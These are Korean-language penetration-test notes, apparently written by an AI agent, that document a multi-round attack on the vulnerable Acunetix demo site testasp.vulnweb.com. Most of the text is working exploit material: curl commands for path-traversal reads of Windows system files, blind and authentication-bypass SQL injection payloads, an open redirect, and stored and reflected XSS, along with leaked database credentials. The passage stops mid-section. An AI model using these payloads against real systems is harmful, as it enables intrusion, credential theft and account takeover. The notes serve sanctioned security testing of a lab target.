# 서버 구조 — testasp-vuln-full

타겟: `http://testasp.vulnweb.com` (HTTP, 80/tcp — HTTPS 미확인)
최초 작성: 2026-09-23 (Round 1, ffuf/gobuster 디렉터리·파일 탐색)

## tech_stack (신호 3개 일치 → 확정)
- `Server: Microsoft-IIS/8.5` (응답 헤더)
- `X-Powered-By: ASP.NET` (응답 헤더)
- `Set-Cookie: ASPSESSIONIDAABTRDTB=...` → **클래식 ASP** 세션 쿠키(ASP.NET SessionID 아님)
  → 같은 호스트에서 ASP(.asp) 페이지를 클래식 ASP 엔진이 서빙
- 오류 페이지가 ASP.NET 기본 `Server Error in '/' Application.` / `<H1>Server Error` 형태
- 정적 파일 응답에 `ETag: "80d42d37b9e5c81:0"`, `Accept-Ranges: bytes`, `Last-Modified`
  (IIS 정적 파일 핸들러) → IIS + ASP/ASP.NET 혼합 구성으로 확정.
- 클라이언트 라이브러리: TinyMCE 2.0RC4 (`/jscripts/tiny_mce/`, 2005-10-30 빌드)

tech_stack 태그: `iis`, `asp`, `asp.net`, `tinymce`

## 인증 방식
- 세션 쿠키 기반. 첫 요청에서 `Set-Cookie: ASPSESSIONIDAABTRDTB=<값>; path=/` 부여.
  **HttpOnly / Secure / SameSite 속성 없음**(응답 헤더 원문 그대로 확인).
- 로그인 폼: `POST /login.asp`, `application/x-www-form-urlencoded`,
  필드명 `tfUName`, `tfUPass`, `<form method="POST" action="">` (자기 자신에 POST).
- 로그아웃: `GET /logout.asp` → 302 `Location: Default.asp`.
- 인증이 필요한 페이지(`/showforum.asp`, `/showthread.asp`)는 세션 없이 호출하면
  302 `Location: Default.asp` 로 리다이렉트 → 미인증 판별이 302 로 명확함.

**재현 가능한 로그인 curl** (자격증명은 `test_account.json` 값으로 치환 — 현재 미발급 상태):
```bash
# 1) 세션 쿠키 확보
curl -s -c /tmp/cj.txt -o /dev/null "http://testasp.vulnweb.com/login.asp"

# 2) 로그인 (POST, 필드명 tfUName / tfUPass)
curl -s -b /tmp/cj.txt -c /tmp/cj.txt -i \
  -X POST "http://testasp.vulnweb.com/login.asp" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "tfUName=<test_account.json의 id>" \
  --data-urlencode "tfUPass=<test_account.json의 pw>"

# 3) 로그인 성공 판정: /showforum.asp 가 302(Location: Default.asp) 대신 200 이면 인증됨
curl -s -b /tmp/cj.txt -o /dev/null -w "%{http_code} %{redirect_url}\n" \
  "http://testasp.vulnweb.com/showforum.asp"
```
프록시를 태우려면 위 curl 들에 `-x http://127.0.0.1:8080` 추가.

### 로그인 필요 여부
`tfUName/tfUPass` POST 폼은 확인했으나 **테스트 계정이 아직 없어 실제 로그인 검증은 미실시**.
`test_account.json` 미발급 → 다음 phase에서 계정 발급 요청 필요(SOUL.md 승인 흐름 3).

## API 패턴
- 별도 REST API 없음. 전부 클래식 ASP 페이지 + 쿼리/폼 파라미터 방식.
  - `GET /search.asp?tfSearch=<값>`
  - `GET /showthread.asp?<파라미터>` (세션 없이 302), `GET /showforum.asp?...`
  - `POST /login.asp` (tfUName/tfUPass)
- 확장자 규칙: `.asp` (동적), `.txt/.js/.css` (정적), `.axd` (ASP.NET 핸들러 —
  Trace.axd 는 앱 레벨에서 403 반환).

## 서버 동작 특성 (스캔 설계에 중요)
- **404 는 균일**: 존재하지 않는 경로는 예외 없이 `404` + `Content-Length: 1245`
  (html/text). 확장자별로 다른 404/403 을 뱉지 않으므로(-.asp/.txt/.bak/.inc/.config/
  .log/.old/.zip/.xml/.asa/.htm/.html 12종 전부 404 1245B 로 동일) 응답코드 필터만으로
  오탐 없이 스캔 가능. 와일드카드 200/403 없음.
- **디렉터리 리스팅 차단**: 디렉터리 경로에 trailing slash 를 붙이면 403 + 1233B
  (`/images/`, `/html/`, `/T/`, `/cgi-bin/` 등). 예외: `/_vti_cnf/` 는 200.
- **대소문자 비구분**: `/Templates`, `/TEMPLATES`, `/templates` 모두 301 → 같은 디렉터리.
  워드리스트 도구가 케이스 변형을 중복 보고하므로 결과 통합 시 확인 필요.
- **`Trace.axd` 는 앱 전역 핸들러**: 어떤 디렉터리 밑에서 호출해도 403 + `Trace Error`
  페이지(2062B)를 반환. 임의 이름 `.axd`(`/randomname.axd`)는 404(1509B)이므로
  "Trace.axd 이름에만" 반응하는 핸들러임이 확인됨 → ASP.NET 추적이 켜져 있고 localOnly 로
  원격 열람만 막힌 상태.
- **WAF 없음**: 델레이/차단/시그니처 응답 없이 초당 ~1000 요청까지 정상 응답(150 동시연결).

## 속도/프록시 특성 (측정값)
- Burp 프록시(`127.0.0.1:8080`) 경유: 약 40~66 req/s 에서 포화(스레드를 30→120 으로
  올려도 36~50초/2000요청 = ~50 req/s 로 정체).
- 프록시 미경유 직접: `-t 150` 에서 약 750~990 req/s.
  → 동일 스캔이 프록시 경유 시 **약 15~20배** 느려짐. 대량 확장자 스캔(47만 요청)을
  프록시로 돌리면 2.5시간이 걸려 직접 요청으로 수행함(아래 일지 Round 1 참고).


## 검증 추가 (Round 2, 2026-09-23 06:07Z)

- **ASP.NET 런타임 버전**: `X-AspNet-Version: 2.0.50727` — ASP.NET 이 처리하는 모든 응답
  (404 오류페이지 포함)에 실림 → **ASP.NET 2.0**.
- **404 크기는 핸들러별로 다름**: `.asp/.txt/... ` 1245B, `.aspx/.ashx/.asmx` 1505B,
  `.axd` 1510B. `-mc` 로 404 를 배제하면 오탐에는 영향 없음.
- **메서드**: `OPTIONS`/`Allow`/`Public` = `OPTIONS, TRACE, GET, HEAD, POST` 로 광고되나
  **실제 `TRACE /` 는 501 Not Implemented** (XST 불가). HTTP/1.1 무-Host 는 HTTP.sys 가
  `400` + `Server: Microsoft-HTTPAPI/2.0` 반환.
- **Host 헤더 처리**: `Location` 에 Host 값이 그대로 반사됨.
  재현:
  ```bash
  IP=$(getent hosts testasp.vulnweb.com | head -1 | cut -d' ' -f1)   # 44.238.29.244
  printf 'GET /aspnet_client HTTP/1.0\r\n\r\n' | nc $IP 80
  #   → Location: http://10.0.0.14/aspnet_client/     (내부 사설 IP 노출, CVE-2000-0649 계열)
  curl -s -i --noproxy '*' -H "Host: 127.0.0.1" "http://$IP/aspnet_client"
  #   → Location: http://127.0.0.1/aspnet_client/     (Host 값 반사)
  ```
- **커버리지**: `.aspx/.ashx/.asmx/.ascx/.axd/.svc` 6종 × raft-small-words = 301,049 요청
  추가 스캔 결과 **신규 파일 0건** → ASP.NET 페이지 파일 없음, 클래식 ASP(.asp)만 동작.

## 검증 추가 (Round 4, 2026-09-23 07:20Z)

- **열려 있는 포트는 80/tcp 하나뿐** (nmap -Pn -sV):
  `80/tcp open Microsoft IIS httpd 8.5`, 443/8080/8443/21/22/25/3389 전부 **filtered**.
  rDNS `ec2-44-238-29-244.us-west-2.compute.amazonaws.com`, `Service Info: OS: Windows`.
  → **HTTPS 미제공**. 브라우저 자동화로 이 타겟에 접근할 때 HTTPS 폴백이 불가능하므로,
  평문 HTTP 를 막는 클라이언트(아래 항목)에서는 아예 열리지 않는다.
- **DreamWeaver 신호 추가**: `httpx -tech-detect` = `DreamWeaver, IIS:8.5,
  Microsoft ASP.NET, Windows Server`. HTML 소스의
  `<!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->`
  주석과 일치 → 템플릿 파일 `Templates/MainTemplate.dwt.asp` 존재가 강하게 추정된다
  (.dwt.asp 는 아직 직접 요청해 본 적 없음 — 다음 라운드 확인 대상).
  tech_stack 태그 갱신: `iis`, `asp`, `asp.net`, `dreamweaver`, `tinymce`.
- **적대적 입력에 대한 응답 분기 (search.asp)** — 서버 동작 특성의 일부로 기록:
  | 요청 | 코드 | 크기 |
  |---|---|---|
  | `/search.asp` (파라미터 없음) | 200 | 2809 |
  | `/search.asp?tfSearch=test` \| `=1` \| `=a` \| `=test post` | **500** | 1208 (IIS 기본 500, 스택트레이스 없음) |
  | `/search.asp?tfSearch=%27` (작은따옴표) | **200** | **2963** |
  검색어가 알파벳/숫자면 500, 작은따옴표 단독이면 200 + 본문 증가. 입력값이 서버 결과에
  질적으로 영향을 준다는 뜻이며 SQL 문자열 조립 지점이 의심된다(주입은 다음 라운드).
- **폼 필드 확정 (hidden 필드 없음)**:
  - `POST /login.asp` (action="") — `tfUName`, `tfUPass`, submit `Login`
  - `POST /register.asp` name=`frmRegister`, `enctype=application/x-www-form-urlencoded`
    — `tfUName`, `tfRName`, `tfEmail`, `tfUPass`, submit `Register me`
  - `GET /search.asp` name=`frmSearch` — `tfSearch`, submit `search posts`
- **도구 환경 제약 2건 (이 환경 한정)**:
  - `whatweb` 은 `/usr/bin/whatweb:257: cannot load such file -- /usr/bin/lib/messages`
    로 실행 불가(패키징 깨짐) → 지문 채취는 `httpx -tech-detect` + 헤더/쿠키 교차검증으로 수행.
  - 브라우저 자동화에서 이 타겟이 `net::ERR_BLOCKED_BY_CLIENT` 로 막힌다. 원인은 Chrome
    for Testing **152.0.7977.8** 의 HTTPS-Upgrade 계열 기능이며,
    `--disable-features=HttpsUpgrades,HttpsFirstModeV2,HttpsFirstBalancedMode` 로 해소된다
    (하네스 browser_exec 에는 chrome 인자를 넘길 훅이 없어 CDP 직접 구동으로 우회 —
    재현 코드 `scratch/cdp_shot.py`). 스크린샷 증거는 `scratch/pages/shot_*.png`.
- **mitmproxy 캡처 경로 동작 확인**: 프록시(127.0.0.1:8080) 경유 요청이
  `.phase-runtime/current/capture.jsonl` 에 정상 적재됨(5줄). `_waf_status_log.jsonl` 도 생성.
- **nuclei 1차(태그 iis,asp,aspnet,microsoft)**: info 등급만 3종 —
  `microsoft-iis-version`(IIS/8.5, 정보성) 과 `iis-shortname-detect`(`/*~1*/a.aspx`,
  `w8ihs7pc*~1*/a.aspx`). **tilde short-name 노출은 재현 검증 전까지 미확정**(이 프로젝트는
  Round 2 에서 nikto 오탐 2건을 경험했으므로 도구 출력을 그대로 채택하지 않는다).

---

## Round 5 검증 추가 (2026-09-23 08:35Z) — 확정된 취약점과 재현 코드

### ★ 1. 임의 파일 읽기 — `/Templatize.asp?item=` (인증 불요, 필터 없음)

서버측 소스 원문(`Templatize.asp` 자체를 `item=Templatize.asp` 로 읽어 확보):

```vbscript
Dim oFileSys, oFile
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
FName = Server.MapPath(".") & "\" & Request.QueryString("item")
Set oFile = oFileSys.OpenTextFile (FName, 1, False, 0)
If (IsObject(oFile)) Then
    Response.Write(oFile.ReadAll)      ' 인코딩 없음 → .asp 소스가 평문으로 나온다
    oFile.Close
End If
' On Error Resume Next 없음 → 실패 시 IIS 500 (1208B)
```

**필터가 없다.** `../db.asp`(깊이 1)가 500 인 것은 차단이 아니라 그 경로
(`wwwroot\db.asp`)에 파일이 없기 때문이다. `..` 개수를 실제 깊이에 맞추면 웹루트 밖 어디든
읽힌다. 500 은 미존재/권한없음으로만 발생하므로 **파일 존재 오라클**로도 쓸 수 있다.

```bash
BASE=http://testasp.vulnweb.com
curl -s "$BASE/Templatize.asp?item=db.asp"        # 200 2908B — DB 접속문자열(자격증명) 노출
curl -s "$BASE/Templatize.asp?item=web.config"    # 200 3138B — IIS 설정 XML (직접 GET 은 404)
curl -s "$BASE/Templatize.asp?item=../../../../windows/win.ini"                          # 200 2763B
curl -s "$BASE/Templatize.asp?item=..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"  # 200 3629B
curl -s "$BASE/Templatize.asp?item=Search.asp"    # 200 — SQLi 쿼리 원문
```

읽힌 소스에서 확정된 DB 접속정보(`db.asp`):
```
Provider=SQLNCLI11;Server=(local)\SQL;Database=acuforum;Uid=acunetix;Pwd=acunetixtrustno1;
```

부정 결과: `global.asa`(모든 경로 변형 500 — 파일 자체가 없음), `logs/web.config`,
`applicationHost.config`(권한), `SAM`, `C:\scripts\logInput.txt`, `win.ini.bak`,
`boot.ini`(2008 R2+ 미존재), `.env`, `..%252f`(이중 인코딩 — 단일과 달리 500).

### ★ 2. 두 번째 파일 읽기 프리미티브 — `/shownews.asp?item=` (인증 불요)

같은 조립식이지만 `Response.Write Server.HTMLEncode(oFile.ReadAll)` 로 HTML 인코딩한다.
파라미터가 없으면 FName 이 빈 문자열이라 500 — 이전 라운드에 이 페이지가 "500 오라클"로만
기록된 이유다.

```bash
curl -s "$BASE/shownews.asp?item=html/about.html"                                        # 200 2161
curl -s "$BASE/shownews.asp?item=web.config"                                             # 200 721
curl -s "$BASE/shownews.asp?item=..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"  # 200 880
curl -s "$BASE/shownews.asp?item=..%2f..%2f..%2fwindows%2fPanther%2funattend.xml"         # 200 5435
```
`unattend.xml` 에서 노출된 것: OS 이미지 Windows Server 2008 R2 DATACENTER, Amazon EC2 이미지
(`RegisteredOwner=EC2`), 내부 빌드경로 `c:/wimbuild/server2008r2x64/install.wim`,
`net user Administrator /ACTIVE:YES` 활성화 스크립트. **자격증명은 들어 있지 않았다**(EC2
ScramblePassword 로 난독화) — 과장 없이 기록.

### ★ 3. SQLi (boolean-blind) — `/search.asp?tfSearch=` (인증 불요)

취약 쿼리 원문(`item=Search.asp` 로 확보):
```vbscript
Response.Write("<div class='path'>You searched for '" & Request.QueryString("tfSearch") & "'</div>")
st  = Request.QueryString("tfSearch")
sql = "SELECT DISTINCT(a.id) as postid, a.poster, a.title, a.message, a.forumid, a.threadid, " & _
      "a.postdate, b.avatar, c.title as ttitle, d.name FROM posts a, users b, threads c, forums d " & _
      "WHERE a.forumid=d.id AND a.threadid=c.id " & _
      "AND (CHARINDEX(a.title, '"&st&"')>0 OR CHARINDEX(a.message, '"&st&"')>0)"
```
`st` 이 **이스케이프 없이** 결합된다. 같은 줄의 `You searched for '<입력>'` 도 무이스케이프
반사 → **반사 XSS**(비인증 GET) 동시 성립.

```bash
# TRUE → 게시글 7행 렌더(200 7699B) / FALSE → 0행(200 3081B)
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (1=1))--" "$BASE/search.asp"
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR (1=2))--" "$BASE/search.asp"
# 서브쿼리 오라클: DB_NAME()='acuforum', SYSTEM_USER='acunetix', @@VERSION LIKE '%SQL Server%'
curl -s -G --data-urlencode "tfSearch=zzq')>0 OR ((SELECT DB_NAME())='acuforum'))--" "$BASE/search.asp"
# 반사 XSS
curl -s -G --data-urlencode 'tfSearch=<script>alert(1)</script>' "$BASE/search.asp"
```

**페이로드 작성 규칙(중요)**: 원본 조건이 `CHARINDEX(...)>0` 이므로 인젝션에서도 `>0` 을
유지해야 하고, 괄호는 `...))--` 로 닫아 균형을 맞춘다. `zzq') OR (1=1) OR (''='` 처럼
`>0` 을 지우면 `(boolean)>0` 이 되어 T-SQL 이 "non-boolean type" 오류 → 500(차단으로 오진하기 쉽다).
UNION 은 500, `; WAITFOR DELAY` 는 지연 없음(스택드 미실행) → **boolean/서브쿼리 오라클만 가능**.

부수 특성: `CHARINDEX(a.title, '<검색어>')` 는 인자 순서가 뒤집혀 **역방향 검색**(게시글 제목이
검색어의 부분문자열인지)이다. 그래서 검색어에 `1` 이 들어가면 제목 `1` 인 게시글이 매칭된다.

### ★ 4. SQLi 인증 우회 + 오픈 리다이렉트 — `/Login.asp`

취약 쿼리 원문:
```vbscript
sql = "SELECT uname, upass FROM users WHERE uname='" & Request.Form("tfUName") & "' AND upass='" & Request.Form("tfUPass") & "'"
Session.Contents("uname") = Request.Form("tfUName")      ' 검증 없이 세션 사용자명으로 저장
...
Response.Redirect(Request.QueryString("RetURL"))          ' 무검증 리다이렉트
```

```bash
# 인증 우회 — 302 Location: Default.asp
curl -s -c /tmp/jar -o /dev/null -w "%{http_code} %{redirect_url}\n" -X POST \
  --data "tfUName=admin'--&tfUPass=x" "$BASE/Login.asp"
# 인증 세션 확보 검증 — 메뉴가 "logout admin'--" 로 바뀐다
curl -s -b /tmp/jar "$BASE/Default.asp" | grep -o 'logout [^<]*'
# 오픈 리다이렉트 — 하이재킹된 세션 + 임의 외부 URL
curl -s -D - -o /dev/null -X POST --data "tfUName=admin'--&tfUPass=x" \
  "$BASE/Login.asp?RetURL=http%3A%2F%2Fexample.com%2F"     # → Location: http://example.com/
# 대조(정상 실패): code=200, 본문에 "Invalid login!"
curl -s -o /dev/null -w "%{http_code}\n" -X POST --data "tfUName=admin&tfUPass=wrongpass" "$BASE/Login.asp"
```
동작: `admin'--`, `x' OR '1'='1'--` 성공. `RetURL` 은 `http://`, `https://`, `//host` 전부 통과.

### ⚠️ 5. 파괴적 코드 — 절대 무단 실행 금지 (showforum.asp / showthread.asp)

```vbscript
' showforum.asp:29  — total > 100 이면 해당 포럼의 스레드/게시글 일괄 삭제
if rs.fields.item("total")>100 then
  conn.Execute "DELETE FROM threads WHERE forumid=" & Request.QueryString("id")
  conn.Execute "DELETE FROM posts   WHERE forumid=" & Request.QueryString("id")
' showthread.asp — 해당 스레드의 모든 게시글 삭제
sqldel = "DELETE FROM posts WHERE id<>0 AND threadid=" & Request.QueryString("id")
```
로그인 세션(우회로 확보 가능) + POST + `id` 주입 조합이면 실제 삭제가 발생한다. 이 두
엔드포인트의 POST 계열은 **사용자 승인(승인 흐름 4) 없이는 시도하지 않는다**. `id` 는
숫자 리터럴만 쓴다.

### 6. 소스로 확정된 기타 사실

- 게시글 입력 필터: `If InStr(1, Request.Form("tfText"), "<a href=") > 0 then Response.End`
  (tfSubject 도 동일). 본문/제목은 `Replace(..., "'", "''")` 로 **따옴표만** 이스케이프되고
  HTML 인코딩은 없다 → `<script>`/`<img src=x onerror=...>` 계열 저장형 XSS 성립 조건.
- `logInput.asp`: `function WriteToFile(FileName, Contents, Append)` + 경로
  `C:\scripts\logInput.txt` 노출. **호출부는 현재 주석 처리**(`'WriteToFile ...`)라 비활성.
  주석이 풀리면 파일 쓰기 프리미티브가 된다.
- `showforum.asp`/`showthread.asp` 의 `id` 도 SQL 문자열에 그대로 결합된다
  (`... AND b.id=" & Request.QueryString("id")`). 별도 라운드에서 검증 예정.

### 7. 스캔 방법론 교훈 (이 서버 필수)

**존재하지만 런타임 오류가 나는 ASP 는 500(1208B)으로 응답한다**(미존재는 404 1245B).
ffuf/nuclei 의 `-mc` 에 **500 을 반드시 포함**해야 한다 — 이전 라운드들이 500 을 제외해
`/shownews.asp`·`/Templatize.asp` 를 통째로 놓쳤다. 미존재 `.asp` 는 쿼리스트링이 붙어도
404 1245B 이므로 오탐 위험은 없다(`/zzznotreal.asp?id=1` 로 확인).

### 8. RAG MCP 상태 (Round 5)

`hermes --profile red mcp list` → `rag` 서버 등록·`✓ enabled`. Round 4 에서의
"No MCP servers configured." 는 해소됨(사용자가 `hermes mcp add` 로 정식 등록).
`write_journal_round` 도 이 라운드에서 정식 MCP 도구로 호출했다(일지 부기 참조).

---

## Round 6 검증 추가 (2026-09-23 09:05Z) — 저장형 XSS 확정 + 쓰기 경로 제약

### ★ 9. 저장형 XSS — `/showthread.asp?id=<n>` POST (`tfSubject` / `tfText`)

소스상 근거(이미 Round 5 에서 `item=ShowThread.asp` 로 확보):
```vbscript
' 필터: showforum.asp 에만 존재. showthread.asp 에는 <a href= 차단조차 없다.
If InStr(1, Request.Form("tfText"), "<a href=") > 0 then Response.End
...
sql = sql & "'" & Session.Contents("uname") & "',"
sql = sql & "'" & Replace(Request.Form("tfSubject"), "'", "''", 1, -1, 1) & " - " & Request.ServerVariables("REMOTE_ADDR") & "',"
sql = sql & "'" & Replace(Request.Form("tfText"), "'", "''", 1, -1, 1) & "', GETDATE())"
conn.Execute sql
```
→ 따옴표만 이스케이프되고 **HTML 인코딩이 없다**. 렌더도 `Response.Write("<div class='posttext'>" & rs.Fields.Item("message") & "</div>")` 로 무이스케이프.

**실증(승인 1건, 2026-09-23)**: `showthread.asp?id=0` 에 게시글 1건 작성 → 저장 본문이
`<div class='posttext'><img src=x onerror=alert(1)></div>` 로 원문 그대로 출력되고
**미인증 방문자 조회에서도 동일** → 모든 열람자에게 실행되는 저장형 XSS.

**브라우저 실행 증거(CDP)** — `scratch/round6/xss_exec_proof.py`:
```bash
/home/taeuk/projects/llm-abliteration/hermes-harness/.venv/bin/python \
  scratch/round6/xss_exec_proof.py out "http://testasp.vulnweb.com/showthread.asp?id=0"
# → Page.javascriptDialogOpening {type:"alert", message:"1", url:".../showthread.asp?id=0"}
#   document.cookie = "ASPSESSIONIDAABTRDTB=..."  (HttpOnly 아님 → JS 로 읽힘)
#   out/xss_proof.png (61,772B)
```
→ **저장형 XSS → 쿠키 탈취 → 세션 하이재킹/계정 탈취** 체인 성립(세션 쿠키에 HttpOnly·Secure·SameSite 없음).

### ⚠️ 10. 쓰기 경로의 숨은 제약 — 세션 사용자명이 SQL 에 재삽입된다 (실패 2건으로 규명)

Round 6 에서 POST 가 **두 번 실패**했고, 두 원인 모두 기록해 둘 가치가 있다.

| 실패 | 증상 | 원인 |
|---|---|---|
| Round 5 쿠키 재사용 | HTTP **200**, 응답 크기 불변(글 생성 안 됨) — **오류가 안 보인다** | 클래식 ASP 세션 만료. jar 로 `/Default.asp` 를 열어 `logout` 링크 유무로 판정해야 한다. |
| `tfUName=admin'--` 우회 후 POST | HTTP **500** (1208B) | `Session.Contents("uname")` 에 **제출 원문**이 그대로 저장되므로 쓰기 SQL 의 `poster='admin'--'` 가 되어 INSERT 가 깨진다. |

**→ SQLi 로그인 우회를 쓸 때는 세션에 저장되는 사용자명이 따옴표 없는 문자열이 되도록
주입 위치를 골라야 한다.** 이 앱에서 동작하는 형태(실측):
```bash
curl -s -c /tmp/j -o /dev/null "$BASE/Login.asp"
curl -s -b /tmp/j -c /tmp/j -X POST "$BASE/Login.asp" \
  --data-urlencode 'tfUName=admin' --data-urlencode "tfUPass=x' OR '1'='1"   # → 302, 세션 uname='admin'
```
(`tfUName=admin'--` 도 로그인 자체는 성공하지만 **쓰기가 전부 500 이 된다** — 읽기 전용
검증에는 무해, 쓰기 검증에는 부적합.)

### 11. 포럼/스레드 구조 (실측)

- `showforum.asp?id=<n>` — 포럼의 스레드 목록. **미인증에서도 200**(열람 제한 없음).
- `showthread.asp?id=<n>` — 스레드의 게시글 목록. **미인증에서도 200**.
- 확인된 id: forum `0`(Acunetix Web Vulnerability Scanner), `1`(Weather), thread `0`, `1`, `2`.
- 게시글 제목은 서버가 `" - " & REMOTE_ADDR` 를 자동 append 한다(작성자 IP 노출).

### ⚠️ 12. 삭제 트리거 — 실행 전 실측으로 회피 (반복)

`showforum.asp`/`showthread.asp` 의 POST 경로는 `total>100` 이면
`DELETE FROM threads|posts WHERE forumid=<id>` / `DELETE FROM posts WHERE id<>0 AND threadid=<id>`
를 실행한다. 이번 라운드는 POST 전에 SQLi 오라클로 임계값 미충족을 확인했다:
```
(SELECT COUNT(*) FROM posts   WHERE threadid=0)>100  → FALSE (0행)
(SELECT COUNT(*) FROM threads WHERE forumid=1)>100   → FALSE (0행)
```
→ `id` 는 숫자 리터럴만 사용했고 `id` 주입은 하지 않았다.

---

## Round 7 검증 추가 (2026-09-23 09:20Z)

### ★ 13. 삭제 트리거 = **구조적 도달 불가** (Round 7 확정, 영구 보류 해제)

Round 6 의 "영구 보류" 판단을 Round 7 에서 뒤집었다 — 회피가 아니라 **원리적으로 발화 불가**임을
증명했기 때문이다. 근거는 카운트 쿼리의 원문이다:

```sql
SELECT (MAX(id)+1) as nextId, COUNT(id) as total FROM posts   WHERE threadid=<주입>
SELECT (MAX(id)+1) as nextId, COUNT(id) as total FROM threads WHERE forumid=<주입>
```
`FROM` 이 `posts`/`threads` 로 **고정**되어 있으므로 `total ≤ 테이블 전체 행수` 다. 실측:
```
(SELECT COUNT(*) FROM posts)>10   TRUE   , >25 FALSE , >100 FALSE   → 11~25행
(SELECT COUNT(*) FROM threads)>10 TRUE   , >25 FALSE , >100 FALSE   → 11~25행
```
→ 어떤 boolean/주석 주입을 넣어도 `total > 100` 을 만들 수 없다. 따라서 `DELETE` 분기는
**이 데이터셋에서 발화 불가**이며, `id` 주입은 읽기 전용으로 취급할 수 있다.
(단, 게시글이 100건을 넘는 순간 다시 위험해진다 → 실행 전 오라클 재측정은 계속 필수.)

### ★ 14. `id` SQLi — 두 엔드포인트 확정 (GET, 읽기 전용)

오라클은 **TRUE=200 / FALSE=500** — `id` 조건이 거짓이면 첫 SELECT 가 0행이 되어
`forumid`/`threadid` 변수가 비고, 그 값이 다음 쿼리에 들어가 SQL 이 깨지기 때문이다.

| 엔드포인트 | TRUE 예 | FALSE 예 |
|---|---|---|
| `showforum.asp?id=` | `id=0 AND 1=1` → 200/5827 (스레드 10링크) | `id=0 AND 1=2` → **500** |
| `showthread.asp?id=` | `id=9 AND 1=1` → 200 (게시글 2) | `id=9 AND 1=2` → **500** |

서브쿼리 오라클(양쪽 동일 동작):
```
(SELECT SYSTEM_USER)='acunetix'  TRUE   / ='sa'     FALSE
(SELECT DB_NAME())='acuforum'    TRUE   / ='master' FALSE
```
추출 시연 — 우리가 만든 스레드 id=9 에서 게시글 수를 블라인드로 정확히 뽑았다:
```
(SELECT COUNT(*) FROM posts WHERE threadid=9)>0, >1  → TRUE
(SELECT COUNT(*) FROM posts WHERE threadid=9)>2, >3, >5, >10 → FALSE   ⇒ 실제값 = 2
```
기타: 오류기반 `0'`·`0"` → 500, 주석 `0--` → 200, 공백대체 `0/**/AND/**/1=1` → 200,
UNION(2컬럼/4컬럼) → 500(불가), `id=9 OR 1=1`(주석 없이) → 500(두 번째 쿼리 깨짐).

**POST 경로(쓰기)** 는 파괴 코드가 사는 곳이라 우리 소유 스레드/포럼으로만 시험했고,
쓰기가 성립할 수 없는 형태만 사용했다:
```
POST showthread.asp?id=9 OR 1=1--   → 500 (카운트 쿼리는 threadid=9 OR 1=1=전체 22행까지 실제 실행, VALUES 절은 -- 로 절단되어 INSERT 불가)
POST showthread.asp?id=9'           → 500 (첫 SELECT 오류 → 스크립트 중단, INSERT 미도달)
POST showforum.asp?id=0 OR 1=1--    → 500
```
→ 3건 모두 **쓰기 0건**. 검증: forum0 스레드 id 집합 0~9 그대로, thread0/thread2/forum1 응답 md5 동일,
우리 스레드 게시글 3건 유지, `Default.asp` 카운트 13→16 = 우리가 추가한 3건과 일치.

### ★ 15. LFI 확장 — 웹루트 밖 민감 파일 (Round 7, 읽기 전용)

경로 기준: 웹루트는 `C:\` 바로 아래 **2단계**(`..%2f×2` = `C:\`). 신규 확보:

| 경로 (`..%2f×2` 기준) | 코드 | 크기 | 내용 가치 |
|---|---|---|---|
| `windows/microsoft.net/framework64/v4.0.30319/config/machine.config` | 200 | 38,773 | .NET 전역 설정 |
| `windows/microsoft.net/framework64/v4.0.30319/config/web.config` | 200 | 45,918 | 신뢰수준/보안정책 |
| `windows/microsoft.net/framework64/v2.0.50727/config/machine.config` | 200 | 29,333 | 구버전 런타임 동시 존재 |
| `windows/system32/inetsrv/config/schema/IIS_schema.xml` | 200 | 93,487 | IIS 스키마 |
| `windows/Panther/unattend.xml` | 200 | 7,052 | 무인설치 응답(원문) |
| `program files/Amazon/Ec2ConfigService/Settings/config.xml` | 200 | 4,791 | **EC2 플러그인 상태** |
| `inetpub/wwwroot/iisstart.htm` | 200 | 3,382 | **다른 사이트 콘텐츠(앱 루트 밖)** |

차단(500): `inetsrv/config/applicationHost.config` · `redirection.config` · `administration.config` ·
`metabase.xml` · `inetpub/history/CFGHISTORY_0000000001/applicationHost.config` ·
`System32/LogFiles/HTTPERR/httperr1.log` · `inetpub/logs/LogFiles/W3SVC1/u_ex2609*.log` ·
`System32/config/SAM` · `Microsoft SQL Server/mssql1[1-4].*/MSSQL/LOG/ERRORLOG`.

**웹루트 위치 판정**: `item=db.asp` → 200 인데 `..%2f×2 inetpub/wwwroot/db.asp` → 500 이므로
**웹루트 ≠ `C:\inetpub\wwwroot`**. 정확한 디렉터리명은 `applicationHost.config` 권한 차단으로 미확정.
같은 호스트의 기본 IIS 사이트(`C:\inetpub\wwwroot`)는 실존하며 앱풀 계정으로 **읽힌다** →
LFI 영향 범위가 이 앱 루트를 넘어선다.

**EC2 config.xml 플러그인 상태**: `Ec2OutputRDPCert=Enabled`, `Ec2ConfigureRDP=Disabled`,
`Ec2SetPassword=Disabled`, `Ec2SetComputerName=Disabled`, `Ec2HandleUserData=Disabled`,
`Ec2FeatureLogging=Enabled`, `AWS.EC2.Windows.CloudWatch.PlugIn=Disabled`.
→ Windows Server 2008 R2 + EC2Config 시대의 AMI. RDP 인증서 출력 플러그인이 켜져 있다는 점은
내부자 관점에서 후속 사슬(원격 접속 자산)로 이어질 수 있으나 **외부에서 직접 도달하는 경로는 아님**.

### ★ 16. 안전 프로토콜 — 상태변경 실증의 표준형 (재사용)

쓰기 표면을 실증할 때는 이 순서를 표준으로 쓴다:
1. **소유권 확보**: 먼저 우리 스레드/게시글을 만들고 그 id 만 대상으로 삼는다(`RT7-` 같은 마커로 식별).
2. **BEFORE 스냅샷**: 건드리지 않는 다른 콘텐츠(다른 스레드/포럼/기본 페이지)를 모두 받아 md5 를 뜬다.
3. **실행 전 위험 분기 측정**: 파괴적 분기의 조건값을 읽기 전용 오라클로 먼저 측정해 도달 불가를 증명.
4. **쓰기 불가 형태로만 주입**: `--` 로 나머지 절을 절단하거나 따옴표로 첫 쿼리를 깨뜨려
   INSERT 가 원리적으로 성립하지 않게 만든다.
5. **AFTER 대조**: md5 재비교 + 카운트 델타가 우리 쓰기량과 정확히 일치하는지 확인.

---

## Round 8 검증 추가 (2026-09-23 09:35Z) — DB 사실 / RCE 사슬 판정

### ★ 17. RCE 사슬 = **불가** (확정)

`search.asp` 블라인드 오라클로 읽은 4중 근거:
```
